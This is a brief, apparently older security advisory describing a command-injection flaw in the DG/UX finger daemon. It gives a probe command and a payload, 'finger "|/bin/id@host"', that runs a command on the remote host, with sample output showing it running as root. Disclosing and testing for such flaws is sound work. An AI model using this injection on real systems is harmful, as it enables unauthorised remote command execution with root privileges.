 The finger daemon that ships with dgux will allow a
 remote user to pipe commands, often with uid root or
 bin. To check for this vulnerability, simply use the
 RFC compliant syntax:

   finger /W@host

 If it returns something like this, it may be vulnerable;

   Login name: /W                     In real life: ???

 To see the uid in.fingerd is running as, try this;

   finger "|/bin/id@host"

 Often, you will see something like this;

  uid=0(root) gid=0(root)
 or
  uid=2(bin) gid=2(bin) groups=2(bin),3(sys),5(mail)
